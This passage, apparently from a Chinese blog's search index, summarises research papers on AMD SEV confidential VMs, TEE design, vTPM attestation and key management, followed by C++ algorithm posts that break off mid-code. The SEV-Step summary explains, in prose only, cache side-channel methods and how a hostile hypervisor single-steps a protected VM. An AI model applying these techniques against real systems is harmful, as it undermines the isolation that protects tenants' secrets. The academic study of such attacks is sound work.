CHECKIN 请求后才能睡眠，防止中断任务执行。如果所有的 Worker vCPU 都不足以应对工作负载，可以考虑启动新的 CVM。\n运行时控制为了方便实现对 Worker vCPU 的动态控制，需要定义一套的 CVM-hypervisor 通信协议。通信基于预先定义的 CPUID 实现。在 SEV-ES 中，CPUID 指令会触发 #VC 异常，会陷入到 guest 内核的 VC 处理程序中，执行必要的检查，并将需要向 hypervisor 提供的信息（信息类型和信息参数等）通过共享的 GHCB 内存块传递，并退出虚拟机回到 hypervisor 进行处理。下图是作者定义的一个简单的通讯协议：\n\n","categories":["操作系统"],"tags":["操作系统","虚拟化","机密计算"]},{"title":"论文《SEV-Step：A Single-Stepping Framework for AMD-SEV》总结","url":"/2025/07/05/%E8%AE%BA%E6%96%87%E3%80%8ASEV-Step%20A%20Single-Stepping%20Framework%20for%20AMD-SEV%E3%80%8B%E6%80%BB%E7%BB%93/","content":"本文将介绍发表在 arXiv 上的论文《SEV-Step: A Single-Stepping Framework for AMD-SEV》。\n\n文章贡献\n在 SEV 环境下引入了可靠（reliable）的单步执行方法。\n将交互式单步执行、页面错误追踪和基于缓存组置换的缓存攻击（eviction set-based cache attacks）整合到一个可复用的框架中。\n\n背景知识基于中断的单步执行基于中断的单步执行方法是一种通过控制处理器中断（如 APIC 时钟中断）来提升微架构攻击的时间分辨率（temporal resolution）的技术。核心思想是利用高频率的中断强制目标程序暂停执行，从而实现对微架构状态（如缓存等）的细粒度观测。\nAPIC 提供了高精度的定时功能，攻击者可以通过配置定时器周期性触发中断，强制目标程序在执行过程中频繁暂停。暂停后，攻击者可以利用侧信道攻击等方法，读取此时的微架构状态，再恢复下一条指令执行。这种方式将时间分辨率从页错误级别提升到了指令级。\n缓存侧信道攻击\n下列内容主要来自《操作系统：原理与实现》（银杏书）的在线章节：操作系统安全的 16.6.2 节。\n\n缓存侧信道是利用时间信息推断程序执行中缓存的行为，进而推断出程序中的关键信息。\nFlush + ReloadFlush + Reload 方法思路是：假设攻击进程和目标进程共享一块内存 ，攻击者的目标是想知道目标进程是否访问了这块共享内存中的某个变量。\n\n共享内存如果不存在，需要事先构造，构造方法在此不做介绍。\n\n具体步骤如下：\n\n攻击进程首先将 cache 清空，方法是不断访问其他内存，用其他内存的数据填满 cache，或直接通过 flush 指令将 cache 清空；\n等待目标进程执行；\n攻击进程访问共享内存中的某个变量，并记录访问的时间：若时间长，则表示 cache miss，意味着目标进程在第二步中没有访问过该变量；若时间短，则表示 cache hit，意味着目标进程在第二步中访问过该变量。\n\nFlush + FlushFlush + Flush 方法思路是基于缓存刷新时间（如 cflush）来推测数据在缓存中的状态，进而推断出程序之前的执行行为。若数据在缓存中，则 cflush 执行时间相比不在缓存中更长。具体步骤如下：\n\n攻击进程首先将 cache 清空；\n等待目标进程执行；\n再次清空不同的缓存区域，若时间较短说明缓存中无数据，时间较长则说明缓存中有数据，意味着目标进程曾经访问过对应的内存。\n\nPrime + ProbePrime + Probe 和 Flush + Reload 类似，但是 无需共享内存的支持 。具体步骤如下：\n\n攻击进程用自己的数据将 cache set 填满（Prime）；\n等待目标进程执行；\n再次访问自己的数据，若时间很短，表示 cache hit，说明目标进程没有将该数据 evict，推导出目标进程没有访问过某个关键数据，反之则说明目标进程访问了某个关键数据。\n\nEvict + Reload与 Prime + Probe 方法不同的是，Evict + Reload 先执行目标进程，之后将  cache set 中的数据清出去，之后再次执行目标进程。比较两次执行的时间，从而得出关键数据是否被访问到。\n具体步骤如下：\n\n等待目标进程执行，并测量执行时间；\n将关键数据所在的 cache set 都替换成攻击进程的数据；\n再次执行目标进程，并测量执行时间。若时间较短，表示 cache  hit，说明攻击进程 evict 的数据没有被目标进程访问，推导出目标进程没有访问过某个关键数据，反之则说明目标进程访问了某个关键数据。\n\n设计与实现SEV-Step 的架构图如下所示：\n\n设计目标设计目标包括：交互性（interactivity）和可复用性（reusability）。\n交互性要求 SEV-Step 不仅能够中断虚拟机的执行，而且要能够在中断时通知攻击者，并在攻击者完成相应的操作（如缓存侧信道攻击）前暂停虚拟机的执行。\n可复用性要求 SEV-Step 将对虚拟机的单步执行与具体的攻击方法解耦，能够被多种攻击方法所适用。\n单步执行单步执行成功的关键在于配置合适的 APIC 时钟周期，既不能太长也不能太短：太长将导致每次中断可能有多条指令被执行，使得“单步执行”的粒度变粗；太短将导致虚拟机在未执行第一条的情况下就被中断，造成零步现象（zero-step）。\n\n为了实现可靠的单步操作，作者采用了下列方法：\n增大单步窗口为了能够有足够的粒度找到合适的时钟配置，单步的窗口应该尽可能大。\n作者选择每次调度虚拟机执行前，清空虚拟机的 TLB 条目，并清除包含第一条指令的页表条目的访问位（accessed bit），尽可能增大从 VMRUN 到第一条指令开始执行的窗口。\n同时，为了系统速度的稳定。作者还做了下列工作：\n\n将运行虚拟机的内核线程固定到特定的 CPU 核心，该核心不运行其他线程。\n通过 BIOS 或者 Linux 的 cpufreq 子系统固定 CPU 频率。\n禁用硬件缓存预取。\n\n\n因为机密虚拟机的威胁模型中，特权软件属于不可信的范畴，因此上述操作都是可行的。\n\n阻止虚拟时钟中断在正常的虚拟机中，在每次宿主机的时钟中断触发后，hypervisor 都需要向虚拟机注入虚拟时钟中断，以实现对虚拟机时钟中断的模拟。但是这将导致虚拟机运行后转到自己的时钟中断处理程序执行，与我们想要攻击用户态程序的目标相悖，因此需要对其进行禁用。\n但是时钟中断对于正常的操作系统来说至关重要，是任务调度的时间指标来源，因此如果虚拟机长时间没有时钟中断可能导致一些问题，还需要定期进行注入。\n确定步长大小为了迭代 APIC 时钟周期以确定是否成功实现了单步，还需要确定本次虚拟机执行与上次虚拟机执行间执行的指令数量。\n观察页表的访问位是一种方法，但是它确定页面是被访问或是没有被访问，无法确定访问次数。作者还使用了另外一种方法：观察虚拟机的性能计数器事件。\n\n有关性能计数器事件，在 IEEE SP ‘22 论文 A systematic look at ciphertext side channels on AMD SEV-SNP 中有介绍。\n\n","categories":["操作系统"],"tags":["操作系统","虚拟化","机密计算"]},{"title":"论文《Remote attestation of confidential VMs using ephemeral vTPMs》总结","url":"/2025/06/28/%E8%AE%BA%E6%96%87%E3%80%8ARemote%20attestation%20of%20confidential%20VMs%20using%20ephemeral%20vTPMs%E3%80%8B%E6%80%BB%E7%BB%93/","content":"本文是对 ACSAC &#39;23 论文《Remote attestation of confidential VMs using ephemeral vTPMs》的总结，以及个人的理解和思考。\n\n解决的问题机密虚拟机（CVM）技术为虚拟机提供一个隔离环境，防止受到 hypervisor 等高特权软件的干扰。但是这样的隔离机制作用于虚拟机运行时，在虚拟机启动过程中，此时的完整性（intergrity）保护依赖于度量启动（measured boot）和运行时证明（runtime attestation）。运行时证明需要一个硬件信任根，在物理机上，TPM 芯片可以作为这样的信任根。然而在云计算环境中，云服务提供商通过设备模拟的方式给用户提供 vTPM，使用这样的模拟设备需要信任云服务提供商，这与 CVM 的威胁模型不符。\n本文作者提出了一种方法，借助 AMD SEV-SNP 技术，在 CVM 内部模拟一个 vTPM，而无需信任 hypervisor。具备以下安全要求：\n\n隔离性：既与 guest 隔离又与 host 隔离。\n安全通信：与物理 TPM 的通信是硬件级隔离的，因此 vTPM 的通信也必须是安全的。\n持久化状态：物理 TPM 的状态在设备被制造时确定并受到硬件保护，vTPM 的状态应该应该由云租户来保存，与云服务提供商隔离。\n\n设计与实现SVSM-vTPM 的架构图和组件构成如下：\n\n隔离性作者利用了 SEV-SNP 所引入的 VMPL 机制：基于 AMD 官方的 VMPL0 管理程序：SVSM 进行扩展，来同时实现与 guest 与 host 的隔离。其中，由于 vTPM 涉及到一些对时钟、随机数生成和加密库的需求，而 SVSM 又是一个裸金属（bare-metal）程序，需要手动移植一些库函数。\n安全通信在 CVM 环境中用一块专门的内存空间（如一个页面）来完成 guest 内核与 vTPM 的通信：每当 guest 内核需要向 vTPM 发送请求时，就向该页面中写入数据，然后将触发虚拟机退出到 hypervisor，hypervisor 调度 VMPL0 的状态执行，VMPL0 中的 SVSM-vTPM 处理程序根据 CVM 的命令进行相应的响应。\n上述通信过程的安全性由 SEV-SNP 特性所保证：guest 内核和 SVSM-vTPM 同属一个 CVM 环境中，内存是共享的，而对于 hypervisor 来说是加密的。因此即便 guest 内核与 SVSM-vTPM 的切换需要经过 hypervisor，这个过程仍然是安全的。而且 SEV-SNP 的硬件特性还确保了 hypervisor 在恢复虚拟机执行时只能恢复到 VMPL0 的上下文，从而防止 hypervisor 抑制 guest 内核发送的 TPM 请求，除非它让整个虚拟机都停止工作。\n持久化状态与物理 TPM 将它的状态保存在芯片内部的非易失性存储器不同，vTPM 必须依赖于一个磁盘中的文件（以下称为 NV 文件）来实现这样的持久化，并且与 vTPM 的模拟软件一样，NV 文件也必须位于可信环境中。\n一种实现方式是：对 NV 文件进行加密，并由用户保存密钥，依赖于 CVM 安全启动机制，在 CVM 启动阶段进行注入。但这会带来一定的系统复杂性。\n作者使用了一种更为简单实用的做法：短时 vTPM（Ephemeral vTPM）。该 vTPM 会在每次启动时创建新的种子和密钥，无需存储持久化的状态。\n\n无持久状态的短时 vTPM 应用场景受限，对于那些需要跨重启周期使用相同密钥的应用场景（例如全盘加密、数据密封等），短时 vTPM 可能无法直接满足需求。\n\n全盘加密全盘加密（Full disk encryption, FDE）通过加密的方式保护磁盘数据，而加密密钥本身也需要进行加密并持久化保存，对磁盘密钥的加密通常由 TPM 中的存储根密钥（Storage root key, SRK）来完成。\n而在短时 vTPM 中，没有持久化的 SRK，因此不能用传统方法实现 FDE。\n\n作者实现基于短期的 eSRK 密钥实现对持久化磁盘密钥的保护所提出的方法，个人并没有太理解。疑惑的点在于：Kisk 是不是依据某种算法稳定生成的（每次都相同）？否则如何利用它来将固定的磁盘密钥 Dk 进行解密？上次运行时用 eSRKpub 进行加密的 Kisk，如何能在本次运行时用 eSRKpriv 进行解密？\n这部分内容可能得等对 TPM 有一个更深入的理解后才能解答。\n","categories":["操作系统"],"tags":["操作系统","虚拟化","机密计算"]},{"title":"论文《SVSM-KMS：Safeguarding Keys for Cloud Services with Encrypted Virtualization》总结","url":"/2025/07/26/%E8%AE%BA%E6%96%87%E3%80%8ASVSM-KMS%EF%BC%9ASafeguarding%20Keys%20for%20Cloud%20Services%20with%20Encrypted%20Virtualization%E3%80%8B%E6%80%BB%E7%BB%93/","content":"本文将介绍 2024 年发表在 arXiv 上的论文《SVSM-KMS：Safeguarding Keys for Cloud Services with Encrypted Virtualization》。\n\n解决的问题密钥管理服务是云环境中最重要的服务之一。集中式密钥管理系统（centralized Key Management System, KMS）通常提供一个统一的平台来进行密钥生成、分发、管理等操作，然而，这会导致可信计算基（TCB）过大，带来单点故障的风险。非集中式的 KMS 是一个方向，但是这会带来为维护多结点一致性的高昂的开销。\n云端的安全密钥管理存在许多问题：首先云服务提供商（CSP）拥有对平台的绝对控制权，需要将其视作可信。此外，网络延迟会影响集中式的 KMS 的效率。同时，如果宿主机系统被攻破，还可能导致密钥的泄露。\n为了解决这些问题，本文基于 AMD SEV-SNP 所引入的 VMPL 机制和 SVSM 特权软件，设计了 SVSM-KMS，将 KMS 放在 CVM 内的最高 VMPL 特权级，与 host 和 guest 隔离开来。具体来说，本文的贡献如下：\n\n基于 VMPL 机制和 SVSM 特权软件，实现了一个原型，将 KMS 与 guest 隔离开来，并评估了系统的性能。\n引入零拷贝设计以提高性能，实现高效的服务交付。\n引入代理服务器，使得本系统能够与传统的 KMS 无缝集成。\n\n背景知识密钥管理系统安全：KMS 的那些事 - 熊喵君的博客 | PANDAYCHEN\n\nThe KMS is an integrated approach for generating, distributing, and managing cryptographic keys for devices and applications. It consists of various components and plays a vital role in securely managing cryptographic keys and secrets. It typically includes functionalities such as key’s generation, storage, rollover and access control. The components of a KMS may include key servers, cryptographic hardware modules, APIs and management interfaces. KMS is essential for protecting sensitive information, ensuring secure communication, enabling data encryption, and meeting compliance requirements. By providing centralized and controlled management of keys, KMS helps organizations maintain the confidentiality, integrity and availability of their data and systems, serving as a crucial foundation for secure operations and safeguarding against unauthorized access and data breaches.\n\n设计与实现系统设计SVSM-KMS 的架构图如下所示：\n\n其主要分为三个模块：服务模块、内核模块和代理服务器。\n服务模块运行在 VMPL0 的服务模块基于开源的 SVSM 开发，密钥服务以服务处理程序的形式实现。\n内核模块为了在用户态向服务模块发起请求，需要借助内核的协助。本文实现了一个内核模块，它在目录树暴露了一个设备文件 /dev/svsm，向应用程序提供了 mmap 和 ioctl 接口，用户通过 ioctl 系统调用向内核模块发起请求，内核模块将这些用户请求通过 GHCB 协议传送到 VMPL0 的 SVSM-KMS 中。在服务完成后，内核模块将返回值拷贝回到用户态中。\n代理服务器代理服务器基于 libhv 网络库实现，它使用 mmap 系统调用将共享内存映射到地址空间中，并使用 ioctl 系统调用将用户请求转发给服务模块。\n零拷贝设计在 SVSM-KMS 中，用户的 KMS 请求要经过两轮的转发：首先代理服务器收到请求后要借助 ioctl 系统调用将其转发到内核模块中，然后内核模块再借助共享内存的方式转发给 SVSM-KMS 服务模块。因此降低数据拷贝的开销是至关重要的。\n本文基于 VMPL 机制，实现了零拷贝设计。具体来说，整个 CVM 仍然算作是一个“虚拟机”，因此其 GPA 是共享的，VMPL 只是借助 RMP 条目中的 VMPL mask 实现的高特权 VMPL 对低特权 VMPL 的“内存隔离”。在本文设计中，SVSM-KMS 服务模块可以控制 Guest OS 对自己内存区域的可见性，那么它也可以为了通信的高效，专门准备一片内存空间，用于 KMS 请求的转发，双方都可以对这片区域进行读写，这样就消除了不必要的拷贝，同时除此以外服务模块的内存空间对于 Guest OS 来说仍然是不可访问的，确保了安全性。\n\n身份验证和访问控制KMS 服务的身份验证和访问控制机制实现在 SVSM-KMS 服务模块中，而非代理服务器中，使得其难以被某些攻击手段所绕过。同时，SVSM-KMS 的身份验证和访问控制机制标准与 Hadoop KMS 保持一致。\n密封存储与远程证明机密虚拟机提供的是内存的安全防护，但是对于 KMS 而言，密钥的持久化保存的安全性同样值得考量。SVSM-KMS 借助向 AMD 安全协处理器 PSP 发起密钥派生（key derivation）服务请求获取用以加密的密封密钥，当代理服务器向 SVSM-KMS 服务模块发起 unsealing 请求时数据被读取到内存中并解封，服务结束时再进行密封并持久化保存。\n和机密虚拟机可信启动一样，SVSM-KMS 服务模块的初始镜像也可以被度量，并借助远程证明机制进行验证。\n无缝集成为了将 SVSM-KMS 无缝与现有的应用程序集成，本文引入了代理服务器。它的主要作用是进行协议转换（protocol exchange），即将用户态发起的 KMS 请求转换为 SVSM 请求的协议标准。\n","categories":["操作系统"],"tags":["操作系统","虚拟化","机密计算"]},{"title":"论文《SoK：Understanding Designs Choices and Pitfalls of Trusted Execution Environments》总结","url":"/2025/12/02/%E8%AE%BA%E6%96%87%E3%80%8ASoK%EF%BC%9AUnderstanding%20Designs%20Choices%20and%20Pitfalls%20of%20Trusted%20Execution%20Environments%E3%80%8B%E6%80%BB%E7%BB%93/","content":"本文将分享发表在 AsiaCCS ’24 上的论文《SoK: Understanding Designs Choices and Pitfalls of Trusted Execution Environments》，文章系统梳理了不同可信执行环境（TEE）设计上的选择和取舍，个人读完之后很有收获，推荐想做或正在做 TEE 设计相关工作的阅读。\n\nTEE 设计核心挑战文章提出了 TEE 设计过程中的核心挑战：TEE 设计如何保护 TEE 实例使用的资源，同时使不受信任的（宿主机）操作系统能够以有效的方式管理计算资源，以履行 CSP 的职责。\n简而言之，就是如何平衡安全隔离和高效性能之间的关系。举个极端的例子，我们可以将虚拟机启动、vCPU 调度、内存分配、异常处理等不可信 hypervisor 的工作完全交给新引入的位于 TCB 中的可信实体（文中称之为 RTPM, TEE Runtime Protection Module）来完成，这样会导致一些问题：在 RTPM 中实现宿主 hypervisor 中复杂的调度策略是不现实的。首先，像 AMD SEV 它的 RTPM 为安全协处理器 PSP 及运行在其中的固件，PSP 只是一颗性能较为孱弱的 Arm 核心，其性能上难以胜任复杂策略；其次，即便是如 Intel TDX 这样基于安全模块的软件实体，也要面临复杂的策略导致的模块代码量的大幅增大，即 TCB 大小扩张带来的攻击面增大。而在 RTPM 中选择简单的策略又会导致性能的严重下降，为此不得不将部分虚拟机资源管理工作交由不可信的 hypervisor 来负责。\nTEE 设计选择在 TEE 提供保护的整个生命周期中，主要分为两个阶段：远程证明和运行时保护。\n\n远程证明大多数的 TEE 都遵循一套类似的远程证明流程，基本如下：\n\nTEE 实体或是 TEE 实体的拥有者（加载 TEE 实体的实体）向一个可信对象发起远程证明请求，这个可信对象位于 TCB 范围内，包括安全协处理器（如 AMD PSP）和可信固件（TDX module）等。\n可信对象生成并且签发一份可核实的认证报告，报告包含 TEE 实体的关键信息，如它的初始状态的安全度量值、平台细节、配置信息等。\nTEE 实体的用户在将隐私数据传递到 TEE 前对报告进行验证，以确保 TEE 如预期那样正常初始化并提供保护。\n\n\n可信启动与远程证明的细节一直是我不太熟悉的部分，之后计划对这部分内容进行梳理，并总结成博客。\n\n运行时保护TEE 资源管理模型不同于远程证明，TEE 的运行时保护实现方式多种多样。文章建立了一套 TEE 资源管理模型，将其分为 4 类（如下图所示）：Unprotected mode、RTPM-only mode、RTPM-guarded mode、Instance-assited mode。\nUnprotected mode 即 TEE 实体将资源管理的权限完全交给不可信 host 来完成（如几乎所有 CVM 将 vCPU 的调度完全交给不可信 host 来完成）；RTPM-only mode 即 RTPM 完全接管 TEE 实体的资源管理（如 SEV-ES 将虚拟机寄存器保留恢复完全由硬件来完成，且保留的寄存器状态 host 不可见）；RTPM-guarded mode 将 RTPM 作为一个间接层，资源直接由不可信 host 管理，但是需要经过 RTPM 的检查或是中转（如 AMD SEV-SNP 将虚拟机二阶页表的修改权限完全交给不可信 host，并借助 RMP 表保证虚拟机的内存完整性）；Instance-assited mode 将大部分资源交给不可信 host 来管理，但部分资源直接由 TEE 实体自身进行管理（如 Keystone 在 TEE 实体内部处理缺页异常）。\n\nCPU 虚拟化设计选择CPU 调度正如前文所提到，绝大多数 TEE 的 CPU 调度基本都采用了 unprotected mode，因为这样能实现高效的资源管理并降低 TCB 的大小。因此，绝大多数 TEE 的威胁模型中都将 Availability 排除出去。\n上下文切换在 TEE 上下文切换过程中，其寄存器状态需要保存到内存中。在没有对这部分内存施加保护的情况下，不可信 host 可以直接对其进行篡改，从而随意改变 TEE 的运行状态，对 TEE 安全性造成极大损害，因此绝大多数 TEE 对此的选择都是 RTPM-only mode。\n如 AMD SEV-ES 将原本虚拟机进入（VMRUN）和退出（#VMEXIT）只进行部分寄存器的保留恢复的过程更改为：原子性地对所有寄存器状态进行保留恢复，并保存到 hypervisor 无法访问的内存区域。而基于 RISC-V 架构的 TEE 中，由于有比不可信 host 运行特权级更高的 M-mode 存在，因此通常由运行在 M-mode 下的可信固件负责 TEE 的上下文切换。\n中断和指令模拟中断和指令模拟仅针对虚拟机级的 TEE。其中，AMD SEV 直接使用 unprotected mode，不对此进行保护。而 AMD SEV-ES/SEV-SNP 则通过引入 GHCB 和 #VC 异常引入了一定的 instance-assisted mode 设计（虚拟机内核中的 #VC 处理程序可以对 GHCB 中 host 的返回值进行简单的验证）。而 Intel TDX 和 IBM PEF 等则采用了 RTPM-guarded mode。\n内存管理设计选择虚拟内存管理绝大多数 TEE 的虚拟管理都采用 instance-assisted mode，这应该很好理解，因为虚拟内存作为一种虚拟的资源，完全可以由 TEE 本身进行管理。具体的例子比如虚拟机内核对虚拟机的（一阶）页表进行管理。\n物理内存分配（访问控制）对于物理内存分配，绝大多数 TEE 都采用 RTPM-guarded mode。通常分为两步：\n\n不可信 host 从内存中选择一些空闲页面分配给 TEE。\nRTPM 进行额外的检查。\n\n区别主要在于，检查的时机和方式不同。一些 TEE 选择在实际访存前进行权限检查，如 AMD SEV-SNP 通过引入 RMP-check，检查本次访存的实体是否有权访问该内存页面，从而实现 guest 和 host 之间、不同 guest 之间的内存隔离。而另一些 TEE 选择在创建页表项的阶段进行合法性检查，如 RISC-V Penglai。\n页面异常处理TEE 对页面异常的处理方式十分多样，包含以下几类：\nRTPM-guarded mode： 如 AMD SEV-SNP，将 TEE 二阶页表的管理权限完全交给不可信 host，包括对二阶缺页的处理，在运行时再通过 RMP 表对其进行检查。\nRTPM-only mode： 如 Intel TDX、RISC-V Penglai 等，在它们的设计中，只有 RTPM 才有权对 TEE 的页表进行修改，因此页面异常的处理必然也需要在其中进行。\nTEE instance-assisted mode： 如 Keystone、CURE 等，其内部包含自己的运行时系统，可以用于维护页表和处理页面异常等。\nI/O 管理设计选择在 I/O 的管理上，绝大多数 TEE 的选择是 unprotected mode，即完全将 I/O 的处理交给不可信 host 来完成。\n如 AMD SEV-ES 中，通过引入 #VC 异常和 GHCB 共享数据结构来实现 guest 借助 host 完成 I/O 操作（与 SEV-ES 的指令模拟流程基本一致）。\n可信 I/O 将是 TEE，更具体地说是 CVM（机密虚拟机）下一个阶段的发展目标。包括 AMD SEV-TIO、Intel TDX 2.0 等都已经有了这方面的构想。\n","categories":["操作系统"],"tags":["操作系统","虚拟化","机密计算"]},{"title":"链表连接出错","url":"/2021/08/31/%E9%93%BE%E8%A1%A8%E8%BF%9E%E6%8E%A5%E5%87%BA%E9%94%99/","content":"太久没接触数据结构了，导致链表这一块的内容有点生疏了，这两天在做一道链表相关的题时出现了一点问题，在此记录一下以免之后再犯。\n问题描述题目链接两数相加\n链表定义struct ListNode &#123;     int val;     ListNode *next;     ListNode() : val(0), next(nullptr) &#123;&#125;     ListNode(int x) : val(x), next(nullptr) &#123;&#125;     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;&#125;;\n解题思路本题很常规，两链表相应位相加得到新链表对应位的值。首先要创建两个个空指针，一个作为新链表的头节点，指向两数相加结果的第一位；一个用以指向链表的子节点，并为其赋值两链表对应位的值相加的结果，最后返回头节点。\n错误代码class Solution &#123;public:    ListNode* addTwoNumbers(ListNode* l1, ListNode* l2) &#123;        ListNode* headNode = nullptr;        ListNode* pathNode = nullptr;        int c = 0;        while (l1 &amp;&amp; l2)        &#123;            int sum = l1-&gt;val + l2-&gt;val + c;            c = sum / 10;            pathNode = new ListNode(sum % 10);            if (!headNode)                headNode = pathNode;            pathNode = pathNode-&gt;next;            l1 = l1-&gt;next;            l2 = l2-&gt;next;        &#125;        while (l1)        &#123;            int sum = l1-&gt;val + c;            c = sum / 10;            pathNode = new ListNode(sum % 10);            pathNode = pathNode-&gt;next;        &#125;        while (l2)        &#123;            int sum = l2-&gt;val + c;            c = sum / 10;            pathNode = new ListNode(sum % 10);            pathNode = pathNode-&gt;next;        &#125;        if (c)        \tpathNode = new ListNode(c);        return headNode;    &#125;&#125;;\n代码乍一看好像没有问题，headNode在指向最初的pathNode后就没有再变更，pathNode也是在每次生成新节点后指向它的子节点，但最后测试得到的结果表明headNode为一个孤立的节点（它的子节点为空指针）。\n问题解决原因分析原来在生成子节点的过程中，我先让pathNode指向它的子节点（此时pathNode子节点为nullptr），然后再让其指向新的节点，这样问题就出现了。\n因为在pathNode子节点为nullptr的时候指向它是没有任何意义的，在随后的 pathNode = new ListNode(sum % 10);中pathNode又指向了一个动态创建的地址，这个地址与原先的pathNode根本没有任何联系，最后得到的结果只能是前一个pathNode结点的子节点仍然为nullptr。正确的做法应该是先对pathNode的子节点赋值，再执行pathNode = pathNode-&gt;next;\n正确代码class Solution &#123;public:    ListNode* addTwoNumbers(ListNode* l1, ListNode* l2) &#123;        ListNode* headNode = nullptr;        ListNode* pathNode = nullptr;        int c = 0;        while (l1 &amp;&amp; l2)        &#123;            int sum = l1-&gt;val + l2-&gt;val + c;            c = sum / 10;            if (!headNode) &#123;                pathNode = new ListNode(sum % 10);                headNode = pathNode;            &#125;            else &#123;                pathNode-&gt;next = new ListNode(sum % 10);                pathNode = pathNode-&gt;next;            &#125;            l1 = l1-&gt;next;            l2 = l2-&gt;next;        &#125;        while (l1)        &#123;            int sum = l1-&gt;val + c;            c = sum / 10;            pathNode-&gt;next = new ListNode(sum % 10);            pathNode = pathNode-&gt;next;            l1 = l1-&gt;next;        &#125;        while (l2)        &#123;            int sum = l2-&gt;val + c;            c = sum / 10;            pathNode-&gt;next = new ListNode(sum % 10);            pathNode = pathNode-&gt;next;            l2 = l2-&gt;next;        &#125;        if(c)            pathNode-&gt;next = new ListNode(c);        return headNode;    &#125;&#125;;\n","categories":["经验"],"tags":["经验","C++","数据结构"]},{"title":"算法分析与设计编程题 回溯法","url":"/2023/09/09/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%9B%9E%E6%BA%AF%E6%B3%95/","content":"装载问题题目描述\n解题代码递归回溯// goods[i]表示货物i的重量, c1,c2分别表示货船1和货船2的载重量vector&lt;vector&lt;int&gt;&gt; optimalLoading(vector&lt;int&gt;&amp; goods, int c1, int c2) &#123;\tint n = goods.size(); // 货物数量\tint maxSum = 0; // 当前最大载货量\t// curSelection[i]表示货物i是否放入货船1中（true表示放入）\tvector&lt;bool&gt; curSelection(n, false);\t// optimSelection记录maxSum对应的货物存放方式\tvector&lt;bool&gt; optimSelection;\t// 递归搜索函数\tfunction&lt;void(int, int)&gt; dfs = [&amp;](int sum, int idx) &#123;\t\tif (idx == n) &#123; // 搜索达到最大深度，得到一个解\t\t\tif (sum &gt; maxSum) &#123; // 更新最优解\t\t\t\tmaxSum = sum;\t\t\t\toptimSelection = curSelection;\t\t\t&#125;\t\t\treturn;\t\t&#125;\t\t// 货物idx能否放入货船1，若能，则向下搜索\t\tif (sum + goods[idx] &lt;= c1) &#123;\t\t\tcurSelection[idx] = true;\t\t\tdfs(sum + goods[idx], idx + 1);\t\t\tcurSelection[idx] = false;\t\t&#125;\t\t// 不考虑将货物idx放入货船1\t\tdfs(sum, idx + 1);\t&#125;;\tdfs(0, 0); // 执行搜索，初始时sum和idx均为0\t// 判断在最优解情况下（将尽可能重的货物放入货船1后），余下的货物能否放入货船2\tint sum2 = 0;\tfor (int i = 0; i &lt; n; ++i) &#123;\t\tif (!optimSelection[i]) &#123;\t\t\tsum2 += goods[i];\t\t&#125;\t&#125;\tif (sum2 &gt; c2) return &#123;&#125;; // 若不能，则此问题无解，返回空数组\t// 若能，则构造最优解\tvector&lt;vector&lt;int&gt;&gt; res(2);\tfor (int i = 0; i &lt; n; ++i) &#123;\t\tif (optimSelection[i]) &#123; // 选择放入货船1\t\t\tres[0].emplace_back(goods[i]);\t\t&#125;\t\telse &#123; // 选择放入货船2\t\t\tres[1].emplace_back(goods[i]);\t\t&#125;\t&#125;\treturn res;&#125;\n状态压缩事实上，对于此类涉及选或不选的回溯算法，还可以将其写成迭代的形式。\n由于递归回溯的本质可以看作是对一棵二叉树进行的搜索，每次选或者不选都将产生两个分支，那么所有情况的数量为 2n（n 为被搜索对象的数目，在本例中为货物的总数）。我们考虑用一个整数 mask 将每种情况表示出来，该整数称为掩码，关注它的 n 位二进制形式，其中 mask 的第 i 位二进制位就代表对应的货物 goods[i]  有没有被选择，通常用 1 代表被选择，0 代表不被选择。那么不难得知 mask 的范围为 0~2n-1 。\n在得到了每一种情况下的掩码后，就需要对其进行解码了，可以遍历 0~n-1 的所有整数 i，并将其右移 i 位，将 goods[i] 的对应的二进制位移到了最低位，此时再将和 1 进行按位与运算就能得知此情况下货物 i 是否被选择。\n两种算法都有 2n 中搜索状态，每种状态下需要 O(n) 时间来进行最优解的更新，因此两种算法的渐进时间复杂度都为 O(n * 2n).\nvector&lt;vector&lt;int&gt;&gt; optimalLoading(vector&lt;int&gt;&amp; goods, int c1, int c2) &#123;\tint n = goods.size();\tvector&lt;bool&gt; curSelection(n, false);\tvector&lt;bool&gt; optimSelection;\tint maxSum = 0;\tfor (int mask = 0; mask &lt; (1 &lt;&lt; n); ++mask) &#123; // 遍历每种情况\t\t// 将sum和curSelection全部复位\t\tint sum = 0;\t\tcurSelection.assign(n, false);\t\tfor (int i = 0; i &lt; n; ++i) &#123;\t\t\tbool isChoosed = (mask &gt;&gt; i) &amp; 1;\t\t\tif (!isChoosed) continue;\t\t\tif (sum + goods[i] &lt;= c1) &#123;\t\t\t\tsum += goods[i];\t\t\t\tcurSelection[i] = true;\t\t\t&#125;\t\t&#125;\t\tif (sum &gt; maxSum) &#123;\t\t\tmaxSum = sum;\t\t\toptimSelection = curSelection;\t\t&#125;\t&#125;\t// 构造最优解（与递归回溯部分完全相同）\tint sum2 = 0;\tfor (int i = 0; i &lt; n; ++i) &#123;\t\tif (!optimSelection[i]) &#123;\t\t\tsum2 += goods[i];\t\t&#125;\t&#125;\tif (sum2 &gt; c2) return &#123;&#125;;\tvector&lt;vector&lt;int&gt;&gt; res(2);\tfor (int i = 0; i &lt; n; ++i) &#123;\t\tif (optimSelection[i]) &#123;\t\t\tres[0].emplace_back(goods[i]);\t\t&#125;\t\telse &#123;\t\t\tres[1].emplace_back(goods[i]);\t\t&#125;\t&#125;\treturn res;&#125;\n批处理作业调度题目描述\n解题代码int batchJobScheduling(vector&lt;vector&lt;int&gt;&gt;&amp; jobs) &#123;\tint n = jobs.size(); // 作业数量\tint res = INT32_MAX, curSum = 0; // 最优调度时间，当前调度时间\tint f1 = 0; // 机器1完成处理时间\tvector&lt;int&gt; f2(n + 1, 0); // 机器2完成处理时间\tvector&lt;int&gt; optimSche; // 最优调度方案\tvector&lt;int&gt; curSche; // 当前调度方案\tfor (int i = 0; i &lt; n; ++i) &#123; // 初始调度方案为 0,1,2,...,n-1\t\tcurSche.emplace_back(i);\t&#125;\t// 递归搜索函数\tfunction&lt;void(int)&gt; dfs = [&amp;](int idx) &#123;\t\tif (idx == n) &#123; // 搜索达到最大深度\t\t\t// 更新最优解\t\t\toptimSche = curSche;\t\t\tres = curSum;\t\t\treturn;\t\t&#125;\t\tfor (int j = idx; j &lt; n; ++j) &#123; // 全排列搜索\t\t\tf1 += 